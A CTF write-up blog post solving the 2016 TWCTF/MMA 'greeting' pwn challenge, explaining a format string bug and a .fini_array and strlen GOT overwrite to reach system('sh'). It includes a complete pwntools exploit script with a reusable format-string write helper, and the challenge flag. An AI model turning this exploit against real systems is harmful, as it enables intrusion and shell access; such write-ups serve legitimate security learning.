---
title: MMA 2nd CTF 2016 -- greeting
layout: single
comments: true
share: true
related: true
author_profile: true
permalink: "/:title/"
tags:
- MMA
- CTF
- format_string
- Python
- Pwnable
categories:
- write-ups
date: '2016-09-12 15:49:00 +0000'
---

**Category:** pwn
**Points:** 150  

<!-- more -->  
  
After a long period of time without playing any CTF, I finally finished my master's degree and have time to enjoy some CTF challenges. And then there is the **Tokyo Western/MMA 2nd CTF**, the first CTF I played in 2016.  
  
The challenge gave us a 32 bit ELF. The program will first use `system` to echo some message, then it will ask us to input our name, and print the greeting message. We can see that there exist a format string vulnerability in the main function:  
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
    int result; // eax@2
    int v4; // edx@4
    int v5; // [sp+1Ch] [bp-84h]@2
    int v6; // [sp+5Ch] [bp-44h]@1
    int v7; // [sp+9Ch] [bp-4h]@1

    v7 = *MK_FP(__GS__, 20);
    printf("Please tell me your name... ");
    if ( getnline((char *)&v6, 64) )
    {
        sprintf((char *)&v5, "Nice to meet you, %s :)\n", &v6);
        result = printf((const char *)&v5); // <-- format string 
    }
    else
    {
        result = puts("Don't ignore me ;( ");
    }
    v4 = *MK_FP(__GS__, 20) ^ v7;
    return result;
}
```

As we can see that the program ends directly after it print out the greeting message, so it's kind of hard for us to do the GOT hijacking attack. After discussing with my teammate, we found that there's one more place we can overwrite the function pointer: **the `.fini_array` section**.  
  
So, we can first overwrite the **first entry** of the `.fini_array` section and hijack the control flow. Notice that we can only input 64 bytes characters, and that's kind of hard for us to write both `system`'s address and `sh`'s string into the memory buffer. Here's what we can do :  
  
* Overwrite both `.fini_array` section and `strlen`'s GOT entry. We replace the first entry of the `.fini_array` section into **main function's address**, while `strlen`'s GOT entry be changed into `system`'s PLT.  
* The program will then return to the main function. Since `strlen`'s GOT has already been changed into `system`'s address, we can then input `sh` and execute `system("sh")` during the `getnline` function (the function will call `strlen` on our input).  

```python
#!/usr/bin/env python

from pwn import *
import subprocess
import sys
import time

HOST = "pwn2.chal.ctf.westerns.tokyo"
PORT = 16317
ELF_PATH = "./greeting"
LIBC_PATH = ""

# setting 
context.arch = 'i386'
context.os = 'linux'
context.endian = 'little'
context.word_size = 32
# ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
context.log_level = 'INFO'

elf = ELF(ELF_PATH)

def my_recvuntil(s, delim):
    res = ""
    while delim not in res:
        c = s.recv(1)
        res += c
        sys.stdout.write(c)
        sys.stdout.flush()
    return res

def myexec(cmd):
    return subprocess.check_output(cmd, shell=True)

def fmtstr(payload, prints, index, data, byte=1):
    """
    data: data that want to be written into the address
    index: stack position (ex. %7$n --> index = 7)
    prints: total charaters that have been print out
    payload: whole payload string, initial value are addresses

    ex.  payload = p32(addr) + p32(addr2) + p32(addr3)
         prints = 12
         payload, prints = fmtstr(payload, prints, 7, 0xa0a0, 2)
         payload, prints = fmtstr(payload, prints, 8, 0xc0, 1)
         payload, prints = fmtstr(payload, prints, 9, 0x08047654, 4)
    """

    if data - prints > 0:
        num = data - prints
    else:
        num = data + 256**byte - prints
        while(num <= 0):
            num += 256**byte
    
    payload += "%" + str(num) + "c" 
    prints = data

    if byte == 1:
        payload += "%" + str(index) + "$hhn"
    elif byte == 2:
        payload += "%" + str(index) + "$hn"
    elif byte == 4:
        payload += "%" + str(index) + "$n"
    elif byte == 8:
        payload += "%" + str(index) + "$lln"

    return payload, prints

def fmtstr_scan(cnt):
    return '.'.join( "%"+str(i)+"$p" for i in xrange(1,cnt+1))

if __name__ == "__main__":

    r = remote(HOST, PORT)
    #r = process(ELF_PATH)

    payload = "AA"+p32(0x08049934) + p32(elf.got['strlen']) + p32(elf.got['strlen']+2) 
    prints = len(payload) + 18
    payload, prints = fmtstr(payload, prints, 12, 0x85ed, 2)
    payload, prints = fmtstr(payload, prints, 13, 0x8490, 2)
    payload, prints = fmtstr(payload, prints, 14, 0x0804, 2)
    print payload
    print len(payload)

    r.sendlineafter("... ", payload)
    r.sendlineafter("... ", "sh\x00")

    r.interactive()
```
  
flag: `TWCTF{51mpl3_FSB_r3wr173_4nyw4r3}`